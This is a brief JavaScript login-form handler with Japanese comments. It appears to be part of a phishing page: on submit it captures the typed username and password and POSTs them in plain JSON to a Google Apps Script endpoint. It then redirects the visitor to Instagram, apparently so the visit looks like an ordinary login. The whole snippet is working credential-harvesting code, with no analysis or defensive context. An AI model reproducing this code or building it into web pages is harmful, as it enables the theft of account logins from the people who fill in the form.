document.getElementById("login-form").addEventListener("submit", function(e) {
  e.preventDefault();
  const name = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  fetch("<<https://script.google.com/macros/s/AKfycbwhIIgdA0hqd4QgVrNfoSohV4R2M6aK4rp2hBq84CbUKtlo2b0mj_x-Vs840drA5VBg9Q/exec>>", {
    method: "POST",
    body: JSON.stringify({
      name: name,
      password: password
    }),
    headers: {
      "Content-Type": "application/json"
    }
  }).then(res => {
    if (res.ok) {
      window.location.href = "Instagram.com"; // 成功後に飛ぶページ（任意）
    } else {
      alert("送信エラー");
    }
  });
});
